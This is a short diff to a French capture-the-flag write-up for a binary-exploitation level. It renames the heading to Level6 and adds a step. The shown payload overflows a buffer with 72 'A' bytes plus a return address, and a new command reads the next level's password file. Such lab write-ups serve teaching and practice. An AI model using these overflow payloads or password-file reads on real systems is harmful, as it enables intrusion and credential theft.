@@ -1,7 +1,7 @@
 
 
 
-# Level5
+# Level6
 
 ---
 ###### Étape 1 : -- Décompiler le programme --
@@ -33,4 +33,10 @@ Payload final :
 
 ```bash
 ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+```
+
+Dans le terminal on execute la commande suivante pour récupérer le password du level7:
+
+```bash
+cat /home/user/level7/.pass
 ```
